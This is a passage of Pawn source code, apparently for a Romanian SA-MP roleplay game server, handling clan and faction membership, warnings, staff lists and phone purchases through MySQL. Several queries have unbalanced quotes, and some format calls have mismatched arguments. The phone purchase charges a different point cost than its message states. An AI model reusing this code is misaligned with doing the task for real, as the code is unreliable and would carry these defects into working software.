	ClanInfo[i][clBonus] = 1;

	gString[0] = gQuery[0] = (EOS);
	format(gString, 128, "Numele ales de tine este: %s.\nCel de-al doilea pas, este de a alege tagul clanului.\nTagul clanului trebuie sa contina intre 3 si 6 caractere.", inputtext);
	ShowPlayerDialog(playerid, DIALOG_CLAN2, DIALOG_STYLE_INPUT, "Shop:", gString, "Ok", "");

	mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `Clan`='%d', `ClanRank`='%d' WHERE `Name`='%s'", PlayerInfo[playerid][pClan], PlayerInfo[playerid][pClanRank], PlayerInfo[playerid][pUsername]);
	mysql_tquery(SQL, gQuery, "", "");
	return true;
}

redist::SQL_CLAN_FIRST(playerid, clan) {
	new szDialog[1024], name[MAX_PLAYER_NAME], szRank1, cwarn, szLastOn[20], szLastOn2[20], laston_db[30], id, cdays, money, Float:hours; listitemmm[playerid] = cache_num_rows(); gString[0] = EOS;
	listitemm[playerid] = listitemmm[playerid]/30; ClanMembers[clan]=listitemmm[playerid];
	strcat(szDialog, "#. Name\tRank - CW - L7H\tLast Online\tClan Days\n");
	for(new i; i != listitemmm[playerid]&&i<30; ++i) {
		cache_get_value_name(i, "name", name, MAX_PLAYER_NAME);
		cache_get_value_name_int(i, "Status", id);
		cache_get_value_name_int(i, "ClanRank", szRank1);
		cache_get_value_name_int(i, "ClanWarns", cwarn);
		cache_get_value_name_int(i, "ClanDays", cdays);
		cache_get_value_name_int(i, "ClanMoney", money);
		cache_get_value_name_float(0, "ConnectedMonth", hours); 
		cache_get_value_name(i, "lastOn", laston_db);
		if(id != -1) format(szLastOn2, 60, "Online");
		else format(szLastOn, 60, "Offline (%s)", laston_db);
		
		format(Selected[playerid][i], MAX_PLAYER_NAME, name);
		SelectedPlayers[playerid][i] = id;
		format(gString, 128, "%d. %s%s\t%d - %d - %.2f\t%s\t%d\n", i+1, name, szLastOn, szRank1, cwarn, hours, szLastOn2, cdays);
		strcat(szDialog, gString);
	}
	strcat(szDialog, "{FFCA60}>> Next Page\n");
	format(gString, 50, ">> Page %d/%d", listitemm[playerid]+1, ClanInfo[clan][clSlots]/30);
	strcat(szDialog, gString);
	listitemmm[playerid]=listitemmm[playerid]>30?30:listitemmm[playerid];
	format(gString, 60, "Clan members: %d/%d", ClanMembers[clan], ClanInfo[clan][clSlots]);
	ShowPlayerDialog(playerid, DIALOG_CLAN_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, gString, szDialog, "Ok", "Back");
	return true;
}

redist::SQL_CLAN_FRESH(playerid, clan) {
	new szDialog[1024], name[MAX_PLAYER_NAME], szRank1, cwarn, id, money, pp, cdays,maxer=cache_num_rows(); gQuery[0] = gString[0] = EOS;
	strcat(szDialog, "#. Name\tRank\tClan Warns\tClan Days\n");
	for(new i; i != maxer; ++i) {
		cache_get_value_name(i, "name", name, MAX_PLAYER_NAME);
		cache_get_value_name_int(i, "Status", id);
		cache_get_value_name_int(i, "ClanRank", szRank1);
		cache_get_value_name_int(i, "ClanWarns", cwarn);
		cache_get_value_name_int(i, "ClanDays", cdays);
		cache_get_value_name_int(i, "ClanPP", pp);
		cache_get_value_name_int(i, "ClanMoney", money);
		
		format(Selected[playerid][i], MAX_PLAYER_NAME, name);
		SelectedPlayers[playerid][i] = id;
		format(gString, 128, "%d. (%s) %s\t%d - $%s (%d pp)\t%d/3\t%d\n", i+1, id!=-1?("online"):("offline"), name, szRank1, FormatNumber(money), pp, cwarn, cdays);
		strcat(szDialog, gString);
	}
	strcat(szDialog, maxer>=30?"{FFCA60}>> Next Page\n":"{FFCA60}>> Back Page\n");
	format(gString, 50, ">> Page %d/3", listitemm[playerid]+1);
	strcat(szDialog, gString);
	format(gString, 60, "Clan members: %d/%d", ClanMembers[clan], ClanInfo[clan][clSlots]);
	ShowPlayerDialog(playerid, DIALOG_CLAN_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, gString, szDialog, "Ok", "Back");
	return true;
}

redist::SQL_QUERY_CLAN(playerid, i, clanid, type) {
	gQuery[0] = gString[0] = (EOS);
	new userID = SelectedPlayers[playerid][i];
	switch(type) {
		case 0: {
			new cw;
			cache_get_value_name_int(0, "ClanWarns", cw); cw ++;
			mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `ClanWarns`='%d' WHERE `Name`='%s'", cw, Selected[playerid][i]);
			mysql_tquery(SQL, gQuery);
			format(gString, 128, "{%s}[CLAN] %s i-a dat lui %s un clan warn.", ClanInfo[clanid][clColor], GetName(playerid), sName[playerid]);
			if(userID != -1) PlayerInfo[userID][pClanWarn] ++;
			if(cw == 3) {
				ClanMembers[PlayerInfo[playerid][pClan]] --;
				format(gString, 128, "Ai fost dat afara din clanul %s de %s, motiv: 3/3 Clan Warns.", ClanInfo[clanid][clName], GetName(playerid));
				InsertEmail(sName[playerid], GetName(playerid), gString);			
				if(userID != -1) {					
					format(gString, 128, "Ai fost dat afara din clan de catre %s (3/3 cw).", GetName(playerid));
					SendClientMessage(userID, COLOR_LIGHTBLUE, gString);
					Iter_Remove(clan_players<PlayerInfo[userID][pClan]>, userID);
					PlayerInfo[userID][pClan] = 0;
					PlayerInfo[userID][pClanRank] = 0;
					PlayerInfo[userID][pClanDays] = 0;
					PlayerInfo[userID][pClanWarn] = 0;
					format(gString, 128, "{%s}[CLAN] %s l-a dat pe %s afara (3/3 cw).", ClanInfo[clanid][clColor], GetName(playerid), sName[playerid]);
					SetPlayerName(userID, PlayerInfo[userID][pUsername]);						
				}
				else format(gString, 128, "{%s}[CLAN] %s l-a dat pe %s (neconectat) afara (3/3 cw).", ClanInfo[clanid][clColor], GetName(playerid), sName[playerid]);	
				mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `Clan`='0', `ClanRank`='0', `ClanDays`='0', `ClanWarns`='0' WHERE `Name`='%s'", sName[playerid]);
				mysql_tquery(SQL, gQuery);
			}
			SendClanMessage(clanid, gString);
		}
		case 1: {
			new cw;
			cache_get_value_name_int(0, "ClanWarns", cw); 	
			if(!cw) return SendClientMessage(playerid, -1, "Acel membru nu are avertizari!");
			cw --;
			format(gString, 128, "{%s}[CLAN] %s i-a scos lui %s un clan warn.", ClanInfo[clanid][clColor], GetName(playerid), sName[playerid]);
		    SendClanMessage(clanid, gString);					
			mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `ClanWarns`='%d' WHERE `Name`='%s'", cw, sName[playerid]);
			mysql_tquery(SQL, gQuery);
			if(userID != -1) PlayerInfo[userID][pClanWarn] --;	
		}
		case 2: {
			new pp, money;
			cache_get_value_name_int(i, "ClanPP", pp);
			cache_get_value_name_int(i, "ClanMoney", money);
			format(gString, sizeof(gString), "Clan Member: %s\n\nMoney deposited: $%s\nPremium Points deposited: %d", sName[playerid], FormatNumber(money), pp);
			ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "CLAN Member Stats", gString, "Cancel", "");
		}
		case 3: {
			new accese[3];
			cache_get_value_name(i, "ClanAccess", gQuery),			sscanf(gQuery, "a<i>[3]", accese);
			format(gString, sizeof(gString), "{F4AD42}Clan {FFFFFF}Access: %s", sName[playerid]);
			format(gQuery, sizeof(gQuery), 
			"Type\tStatus\n\
      		Clan Warn / Clear Clan Warn\t%s\n\
      		{FFFFFF}Uninvite\t%s\n\
      		{FFFFFF}Change rank\t%s",
      		accese[0]?"{ff0000}Disable":"{0ac917}Enabled",
      		accese[1]?"{ff0000}Disable":"{0ac917}Enabled",
      		accese[2]?"{ff0000}Disable":"{0ac917}Enabled");
      		ShowPlayerDialog(playerid, DIALOG_CLAN_ACCESS, DIALOG_STYLE_TABLIST_HEADERS, gString, gQuery, "Select" ,"Cancel");
		}
	}
	return true;
}

redist::setVehicleRespawn(idd) {
	SetVehicleToRespawn(CarInfo[idd][Spawned]);
	SetVehicleHealth(CarInfo[idd][Spawned], CarInfo[idd][cVip] ? 2000 : 1000);
	CarInfo[idd][cTime] = 600;
	SetTunning(idd);
	return true;
}

stock HexToInt(const string[])//DracoBlue
{
   if (string[0] == 0) return 0;
   new i, cur=1, res = 0;
   for (i=strlen(string);i>0;i--) {
     if (string[i-1]<58) res=res+cur*(string[i-1]-48); else res=res+cur*(string[i-1]-65+10);
     cur=cur*16;
   }
   return res;
}

redist::cache_sql_staff_adm_manage(playerid) {
	new stucks, cheaters, dm, afaceri;
	cache_get_value_name_int(0, "Stucks", stucks);
	cache_get_value_name_int(0, "Cheaters", cheaters);
	cache_get_value_name_int(0, "A_DM", dm);
	cache_get_value_name_int(0, "Stucks", afaceri);			
	format(gString, 128, "Admin name: %s\n\nStucks: %d\nCheaters: %d\nDM: %d\nAfaceri: %d", sName[playerid], stucks, cheaters, dm, afaceri);
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Admin Info", gString, "Cancel", "");
	return true;
}

redist::cache_clan_manage_members(playerid) {
	format(gString, sizeof(gString), "%s", sName[playerid]);
    ShowPlayerDialog(playerid, DIALOG_CLAN_MANAGE2, DIALOG_STYLE_LIST, gString, "Uninvite\nGive rank\nClan warn\nRemove Clan Warn\nMember stats\nClan Access", "Ok" ,"Back");
	return true;
}

redist::SQL_cache_staff_admins(playerid) {
	new szName[MAX_PLAYER_NAME], szLastOn[30], laston_db[30], szPlayers, szAdmin, szPlayersT, warns, userID=-1, Float:hours;  gString[0] = gQuery[0] = (EOS);
	strcat(gString, "Name\tStatus\tRaport\tWarns - L7H\n");
	for(new i, j = cache_num_rows(); i < j; i++) {
		cache_get_value_name(i, "name", szName);
		cache_get_value_name_int(i, "Admin", szAdmin); 
		cache_get_value_name(i, "lastOn", laston_db);
		cache_get_value_name_int(i, "HelpedPlayers", szPlayers);
		cache_get_value_name_int(i, "HelpedPlayersToday", szPlayersT);
		cache_get_value_name_int(i, "AW", warns); 
		cache_get_value_name_int(i, "Status", userID); 
		cache_get_value_name_float(0, "ConnectedMonth", hours); 
		if(userID != -1) format(szLastOn, 60, "Online (%d)", userID);
		else format(szLastOn, 60, "Offline (%s)", laston_db);
		
		format(gQuery, 128, "(%d) %s\t%s\t%d on this week / %d total\t[%d/3] - %.2f\n", szAdmin, szName, szLastOn, szPlayersT, szPlayers, warns, hours);
		strcat(gString, gQuery);			
	}
	format(gQuery, 128, "{FFEE00}Admins (%d/%d)", Iter_Count(Staff<ADMIN>), cache_num_rows());
	ShowPlayerDialog(playerid, DIALOG_STAFF_ADMINS, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Cancel", "");
	return true;
}

redist::SQL_cache_staff_helpers(playerid) {
	new szName[MAX_PLAYER_NAME], szLastOn[30], laston_db[30], szPlayers, szAdmin, szPlayersT, warns, userID=-1, Float:hours;  gString[0] = gQuery[0] = (EOS);
	strcat(gString, "Name\tStatus\tRaport\tWarns -  L7H\n");
	for(new i, j = cache_num_rows(); i < j; i++) {
		cache_get_value_name(i, "name", szName);
		cache_get_value_name_int(i, "Helper", szAdmin); 
		cache_get_value_name(i, "lastOn", laston_db);
		cache_get_value_name_int(i, "HelpedPlayers", szPlayers);
		cache_get_value_name_int(i, "HelpedPlayersToday", szPlayersT);
		cache_get_value_name_int(i, "HW", warns); 
		cache_get_value_name_int(i, "Status", userID); 
		cache_get_value_name_float(0, "ConnectedMonth", hours); 
		if(userID != -1) format(szLastOn, 60, "Online (%d)", userID);
		else format(szLastOn, 60, "Offline (%s)", laston_db);
		
		format(gQuery, 128, "(%d) %s\t%s\t%d on this week / %d total\t[%d/3] -  %.2f\n", szAdmin, szName, szLastOn, szPlayersT, szPlayers, warns, hours);
		strcat(gString, gQuery);			
	}
	format(gQuery, 128, "{FFEE00}Helpers (%d/%d)", Iter_Count(Staff<HELPER>), cache_num_rows());
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Cancel", "");
	return true;
}

redist::SQL_cache_staff_leaders(playerid) {
	new szName[MAX_PLAYER_NAME], szLastOn[30], laston_db[30], warns, userID=-1, leader, Float:hours;  gString[0] = gQuery[0] = (EOS);
	strcat(gString, "Name\tStatus\tFaction\tWarns - L7H\n");
	for(new i, j = cache_num_rows(); i < j; i++) {
		cache_get_value_name(i, "name", szName);
		cache_get_value_name(i, "lastOn", laston_db);
		cache_get_value_name_int(i, "LW", warns); 
		cache_get_value_name_int(i, "Status", userID); 
		cache_get_value_name_int(i, "Leader", leader); 
		cache_get_value_name_float(0, "ConnectedMonth", hours); 
		if(userID != -1) format(szLastOn, 60, "Online (%d)", userID);
		else format(szLastOn, 60, "Offline (%s)", laston_db);
		
		format(gQuery, 128, "%s\t%s\t%s\t[%d/3] - %.2f\n", szName, szLastOn, DynamicFactions[leader][fName], warns, hours);
		strcat(gString, gQuery);			
	}
	format(gQuery, 128, "{FFEE00}Leaders (%d)",  cache_num_rows());
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Cancel", "");
	return true;
}

redist::sql_check_phone_(playerid, PhoneNr) {
	if(cache_num_rows()) {
		SendClientMessage(playerid, -1, "Acest numar este deja luat.");
		ShowPlayerDialog(playerid, DIALOG_IPHONE, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti achizitionezi un iPhone.\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 4 cifre.", "Ok", "Back");
		return true;
	}
	
	if HavePhone(playerid) *then DeleteSVar(PlayerInfo[playerid][pPhone]);
	format(PlayerInfo[playerid][pPhone], 10, "%d", PhoneNr);
	SetGVarInt(PlayerInfo[playerid][pPhone], playerid+1);
	UpdateVar(playerid, "PhoneNr", PhoneNr);
    if(ShopType[playerid] != 3) {
    	SCMf(playerid, COLOR_WHITE, "{47A033}(SHOP INFO){D7FFB3} Ti-ai cumparat un iPhone pentru 100 Premium Points. Numarul: %d (-100 premium points)", PhoneNr);
        PlayerInfo[playerid][pPremiumPoints] -= 20;
        UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	}	
	else SCMf(playerid, COLOR_WHITE, "Numarul tau ales este: %d", PhoneNr);
	return true;
}

redist::sql_new_phone(playerid, PhoneNr) {
	if(cache_num_rows()) {
		SendErrorMsg(playerid, "Acest numar este deja luat!");
		return ShowPlayerDialog(playerid, DIALOG_NEWNUMBER, DIALOG_STYLE_INPUT, "{FFFFFF}Shop:", "{FFFFFF}Esti pe cale sa-ti achizitionezi un iPhone.\n{FFFFFF}Tot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 4 cifre.\n\n{FFFFFF}Link numere libere: {FF0000}https://panel.b-hood.ro/general/freenumbers", "Select", "");
	}
	
	if(HavePhone(playerid)) DeleteSVar(PlayerInfo[playerid][pPhone]);
	format(PlayerInfo[playerid][pPhone], 10, "%d", PhoneNr);
	SetGVarInt(PlayerInfo[playerid][pPhone], playerid+1);
	UpdateVar(playerid, "PhoneNr", PhoneNr);
	va_SendClientMessage(playerid, COLOR_WHITE, "{47a033}(SHOP INFO) {D7FFB3}Numar setat: %d", PhoneNr);
	return true;
}

redist::sql_new_phone2(playerid, const PhoneNr[]) {
	if(cache_num_rows()) {
		SendErrorMsg(playerid, "Acest 'custom number' este folosit deja!");
		return true;
	}
	strmid(request_num[playerid], PhoneNr, 0, 10);
	request_number[playerid] = 0;
	ABroadcast(-1, 1, "{00820d}(/anumber): {FFFFFF}%s doreste sa-si puna numarul custom '%s'. [/anumber %d]", GetName(playerid), PhoneNr, playerid);
	value_report[playerid] =0;
	report_ago[playerid] = gettime();
	strmid(report_by[playerid], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
	show_admin_report();
	DeelayCommand[playerid][34]=gettime()+50;
	return true;
}

redist::sql_check_faction_leader(playerid, i) {
	new name[MAX_PLAYER_NAME] = {"None"};
	cache_get_value_name(0, "name", name);
	format(gString, 128, "Faction name: %s\nFaction leader: %s\nMembers: %d/%02d\nApplication status: %s", FactionName(i), name, FactionMembers[i], DynamicFactions[i][fMaxMembers], DynamicFactions[i][fApp]?("{2FC914}Opened"):("{FF0000}Closed"));
	ShowPlayerDialog(playerid, DIALOG_FACTIONS1, DIALOG_STYLE_MSGBOX, "Info", gString, "HQ", "Close");
	return true;
}

redist::sql_cache_leader(playerid) {
	FactionMembers[PlayerInfo[playerid][pMember]] --;
	if(svfCar[playerid]) destroySVF(playerid);
	StopReportLession(playerid);
	if(cache_num_rows() != 0) {
		format(gString, 180, "%s left %s (rank %d) after %d days using /quitgroup, with 30 faction punish.", PlayerInfo[playerid][pUsername],FactionName(PlayerInfo[playerid][pMember]),PlayerInfo[playerid][pRank],PlayerInfo[playerid][pDays]);
		insertFactionLogs(-1, playerid, gString);
		PlayerInfo[playerid][pMember]=0;
		PlayerInfo[playerid][pLeader]=0;
		PlayerInfo[playerid][pRank] = 0;
		PlayerInfo[playerid][pFACWarns] = 0;
		PlayerInfo[playerid][pExpFW] = -1;
		FactionSpawn[playerid] = 0;
    	UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
		UpdateVar(playerid, "ExpFW", PlayerInfo[playerid][pExpFW]);
		PlayerInfo[playerid][pFpunish] = 30;
		mysql_format(SQL, gQuery, 128,"UPDATE users SET `Member`='0',`Leader`='0',`Rank`='0',`FWarn`='0',`FPunish`='20',`Days`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gQuery);
	}
	else {
		format(gString, 180, "%s left %s (rank %d) after %d days using /quitgroup, with 0 faction punish.", PlayerInfo[playerid][pUsername],FactionName(PlayerInfo[playerid][pMember]),PlayerInfo[playerid][pRank],PlayerInfo[playerid][pDays]);
		insertFactionLogs(-1, playerid, gString);
		PlayerInfo[playerid][pMember]=0;
		PlayerInfo[playerid][pLeader]=0;
		PlayerInfo[playerid][pRank] = 0;
		PlayerInfo[playerid][pFACWarns] = 0;
		PlayerInfo[playerid][pExpFW] = -1;
		FactionSpawn[playerid] = 0;
    	UpdateVar(playerid, "FactionSpawn", FactionSpawn[playerid]);
		UpdateVar(playerid, "ExpFW", PlayerInfo[playerid][pExpFW]);
		PlayerInfo[playerid][pFpunish] = 0;				
		mysql_format(SQL, gQuery, 128, "UPDATE users SET `Member`='0',`Leader`='0',`Rank`='0,`FWarn`='0',`FPunish`='0',`Days`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gQuery);
		SendClientMessage(playerid, COLOR_YELLOW, "Nu ai primit FPunish deoarece nu este lider!");
	}

	OnDuty[playerid] = 0;
	PlayerTextDrawHide(playerid, dutyTD);
	tazer[playerid] = 0;
	SetPlayerArmourEx(playerid, 0);
	if !IsACop(playerid) *then SetPlayerToTeamColor(playerid);
	SpawnPlayer(playerid);
	return true;
}

redist::sql_cache_members(playerid) {
	new rank;
	cache_get_value_name_int(0, "Rank", rank);				
	format(gString, 128, "Member: %s", sName[playerid]);
	Dialog_Show(playerid, DIALOG_MEMBERS1, DIALOG_STYLE_LIST, gString, "Rank\nFaction warn\nUninvite\nClear faction warn", "Ok", "Back");
	return true;
}
Dialog:DIALOG_MEMBERS1(playerid, response, listitem, inputtext[]) {
	if(!response) return ShowFactionMembers(playerid);
	if(PlayerInfo[playerid][pRank] < 6) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 6+ pentru a putea merge mai departe!");
	switch(listitem) {
		case 0: Dialog_ShowEx(playerid, DIALOG_MEMBERS2, DIALOG_STYLE_INPUT, "Give rank", "Scrie mai jos rankul pe care vrei sa il dai membrului %s.", "Ok", "Close",sName[playerid]);
		case 1: {
			format(gString, sizeof gString, "Scrie motivul pentru care vrei sa-i acorzi un Faction Warn lui %s.", sName[playerid]);
			Dialog_Show(playerid, DIALOG_GIVEFW, DIALOG_STYLE_INPUT, "Give FW", gString, "Ok", "Close");	
		}
		case 2: {
			format(gString, sizeof gString, "Uninvite %s", sName[playerid]);
			Dialog_Show(playerid, DIALOG_REASON, DIALOG_STYLE_INPUT, gString, "Scrie mai jos motivul pentru pe care vrei sa-l demiti pe acest membru.", "Ok", "Close");	
		}
		case 3: {
			format(gString, sizeof gString, "Scrie motivul pentru care vrei sa-i stergi un Faction Warn lui %s.", sName[playerid]);
			Dialog_Show(playerid, DIALOG_CLEARFW, DIALOG_STYLE_INPUT, "Clear FW", gString, "Ok", "Close");	
		}
	}
	return true;
}
Dialog:DIALOG_GIVEFW(playerid, response, listitem, inputtext[]) {
	new userID = MySQLCheckAccount(sName[playerid]);
	if(!response) return true;
	new fw,days,rank,id;				
	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
	new Cache: result = mysql_query(SQL, gQuery);
	cache_get_value_name_int(0, "FWarn", fw);
	cache_get_value_name_int(0, "Days", days);
	cache_get_value_name_int(0, "Rank", rank);
	//if(PlayerInfo[playerid][pRank] == 6 && rank >= 6) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti da FW unui membru cu rank 6+!");
	cache_get_value_name_int(0, "id", id);				
	cache_delete(result);
	fw++;
	
	format(gString, sizeof(gString), "%s i-a acordat lui %s un Faction Warn.", GetName(playerid), sName[playerid]);
	SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);

	format(gString, sizeof gString, "%s received a faction warn from %s, reason: (FW: %d/3)", sName[playerid], sName[playerid], PlayerInfo[playerid][pUsername], fw);
	factionLog(PlayerInfo[playerid][pMember], gString);
	
	mysql_format(SQL,gQuery,128,"UPDATE `users` SET `FWarn`='%d' WHERE `name`='%s' LIMIT 1",fw,sName[playerid]);
	mysql_tquery(SQL,gQuery);
	if(userID != INVALID_PLAYER_ID) PlayerInfo[userID][pFACWarns] = fw;						
	if(fw >= 3)
	{
		FactionMembers[PlayerInfo[playerid][pMember]] --;
		format(gString, 128, "Ai fost dat afara din factiunea %s (rank %d) dupa %d zile de %s, motiv: 3/3 Faction Warns", FactionName(PlayerInfo[playerid][pMember]), rank, days, GetName(playerid));
		InsertEmail(sName[playerid], GetName(playerid), gString);
		if(userID != INVALID_PLAYER_ID) {
			PlayerInfo[userID][pFACWarns] = 0;	
			PlayerInfo[userID][pExpFW] = gettime() + (7 * 86400);
			Iter_Remove(faction_players<PlayerInfo[userID][pMember]>, userID);
			PlayerInfo[userID][pMember] = 0;
			PlayerInfo[userID][pTester] = false;
			PlayerInfo[userID][pResponsabil] = false;
			PlayerInfo[userID][pRank] = 0;
			PlayerInfo[userID][pFpunish] = 20;
			PlayerInfo[userID][pDays] = 0;
			FactionSpawn[userID] = 0;
    		UpdateVar(userID, "FactionSpawn", FactionSpawn[playerid]);
			PlayerTextDrawHide(userID, JobTD);
			SetPlayerSkin(userID, 47);
			SpawnPlayer(userID);
			format(gString, 128, "Ai fost demis din factiunea %s de AdmBot, motiv: 3/3 FW.", FactionName(PlayerInfo[playerid][pMember]));
			ShowPlayerDialog(userID, 0, DIALOG_STYLE_MSGBOX, "Uninvite", gString, "Close", "");							
		}					
		format(gString, 128, "%s a fost dat afara de AdmBot, motiv: 3/3 FW.", sName[playerid]);
		SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);
	
		format(gString, 128, "%s was uninvited by %s from faction %s (rank %d) after %d days with 0 FP, reason: 3/3 Faction Warns.", sName[playerid], PlayerInfo[playerid][pUsername],FactionName(PlayerInfo[playerid][pMember]),rank, days);
		insertFactionLogs(-1, playerid, gString);				
		if(days < 14) {
			_query("UPDATE `users` SET `Member`='0',`Rank`='0,`FPunish`='30',`FWarn`='0',`Leader`='0',`Days`='0',`Tester`='0',`ExpFW`='%i' WHERE `name`='%s' LIMIT 1", gettime() + (7 * 86400), sName[playerid]);
		}
		else _query("UPDATE `users` SET `Member`='0',`Rank`='0,`FPunish`='0',`FWarn`='0',`Leader`='0',`Days`='0',`Tester`='0',`ExpFW`='%i' WHERE `name`='%s' LIMIT 1", gettime() + (7 * 86400), sName[playerid]);
	}
	return true;
}
Dialog:DIALOG_CLEARFW(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
	new Cache: result = mysql_query(SQL, gQuery), fw;
	cache_get_value_name_int(0, "FWarn", fw);
	cache_delete(result);
	if(fw == 0) return true;
	format(gString, sizeof(gString), "%s i-a scos lui %s un Faction Warn.", GetName(playerid), sName[playerid]);
	SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);			
	mysql_format(SQL,gQuery,128,"UPDATE `users` SET `FWarn`='%d' WHERE `name`='%s' LIMIT 1",fw-1,sName[playerid]);
	mysql_tquery(SQL,gQuery);
	return true;
}
Dialog:DIALOG_REASON(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	SetPVarString(playerid, "Reason", inputtext);
	format(gString, sizeof(gString), "Uninvite %s", sName[playerid]);
	Dialog_Show(playerid, DIALOG_MEMBERS3, DIALOG_STYLE_INPUT, gString, "Scrie mai jos numarul de FP-uri pe care vrei sa-i dai acestui membru.\nDaca membrul are peste 14 zile, aceasta poate primi fara FP dar cu exceptii", "Ok", "Close");
	return true;
}
Dialog:DIALOG_MEMBERS3(playerid, response, listitem, inputtext[]) {
	if(!response) 
		return true;

	new fp = strval(inputtext),userID, reason[64];
	if(fp < 0 || fp > 100) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Faction Punish invalid!");
	GetPVarString(playerid, "Reason", reason, 64);
	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
	new Cache: result = mysql_query(SQL, gQuery), id,rank,days;
	cache_get_value_name_int(0, "id", id); 
	cache_get_value_name_int(0, "Rank", rank); 
	cache_get_value_name_int(0, "Days", days); 
	cache_get_value_name_int(0, "Status", userID);
	cache_delete(result);
	FactionMembers[PlayerInfo[playerid][pMember]] --;
	format(gString, 128, "Ai fost dat afara din factiunea %s (rank %d) dupa %d zile de %s, motiv: %s.",  FactionName(PlayerInfo[playerid][pMember]), rank, days, GetName(playerid), reason);
	InsertEmail(sName[playerid], GetName(playerid), gString);				
	format(gString, 144, "%s was uninvited by %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s", sName[playerid],PlayerInfo[playerid][pUsername],FactionName(PlayerInfo[playerid][pMember]),rank, days,reason);
	insertFactionLogs(-1, playerid, gString);

	if(userID != -1) {
		PlayerInfo[userID][pFACWarns] = 0;
		PlayerInfo[userID][pExpFW] = gettime() + (7 * 86400);
		Iter_Remove(faction_players<PlayerInfo[userID][pMember]>, userID);
		PlayerInfo[userID][pMember] = 0;
		PlayerInfo[userID][pRank] = 0;
		PlayerInfo[userID][pFpunish] = 0;
		PlayerInfo[userID][pDays] = 0;
		PlayerTextDrawHide(userID, JobTD);
		SpawnPlayer(userID);
		FactionSpawn[userID] = 0;
    	UpdateVar(userID, "FactionSpawn", FactionSpawn[userID]);
	}
	if(fp==0) format(gString, sizeof gString, "%s was uninvited by %s from faction %s (rank %d) after %d days, without FP. Reason: %s.", sName[playerid], PlayerInfo[playerid][pUsername], FactionName(PlayerInfo[playerid][pMember]), rank, days, reason);
	else format(gString, sizeof gString, "%s was uninvited by %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s.", sName[playerid], PlayerInfo[playerid][pUsername], FactionName(PlayerInfo[playerid][pMember]), rank, days, fp, reason);
	factionLog(PlayerInfo[playerid][pMember], gString);
		
	if(fp == 0) {
		format(gString, 128, "%s was uninvited by %s from faction %s (rank %d) after %d days, without FP. Reason: %s.", GetName(playerid), sName[playerid], FactionName(PlayerInfo[playerid][pMember]), rank, days, reason);
		SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);	
		if(userID != -1) {
			format(gString, 128, "Ai fost demis din factiunea %s de %s fara FP, motiv: %s.", FactionName(PlayerInfo[playerid][pMember]), GetName(playerid), reason);
			ShowPlayerDialog(userID, 0, DIALOG_STYLE_MSGBOX, "Uninvite", gString, "Close", "");
		}								
	}
	else {
		format(gString, 128, "%s was uninvited by %s from faction %s (rank %d) after %d days, with %d FP. Reason: %s.", GetName(playerid), sName[playerid], FactionName(PlayerInfo[playerid][pMember]), rank, days, fp, reason);
		SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);	
		if(userID != -1) {
			format(gString, 128, "Ai fost demis din factiunea %s de %s cu FP, motiv: %s.", FactionName(PlayerInfo[playerid][pMember]), GetName(playerid), reason);
			ShowPlayerDialog(userID, 0, DIALOG_STYLE_MSGBOX, "Uninvite", gString, "Close", "");
		}					
	}
	mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Member`='0',`Rank`='0',`FPunish`='%i',`FWarn`='0',`SpawnChange`='0',`Raport`='0 0 0',`Leader`='0',`Days`='0', `ExpFW` = '%i', `FactionSpawn`='0' WHERE `name`='%s' LIMIT 1",fp, gettime() + (7 * 86400), sName[playerid]);
	mysql_tquery(SQL, gQuery, "", "");	
	return true;
}
Dialog:DIALOG_MEMBERS4(playerid, response, listitem, inputtext[]) {
	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
	new Cache: result = mysql_query(SQL, gQuery), bool:tester, userID;
	cache_get_value_name_bool(0, "Tester", tester);
	cache_get_value_name_int(0, "Status", userID);
	cache_delete(result);
	if(tester==bool:response) return true;
	if(userID!=-1) {
		PlayerInfo[userID][pTester]=bool:response;
		finishAchievement(userID, 33);
	}
	if(response) format(gString, 128, "%s l-a promovat pe %s la functia de tester.", GetName(playerid), GetName(userID));
	else format(gString, 128, "%s l-a scos pe %s de la functia de tester.", GetName(playerid), GetName(userID));
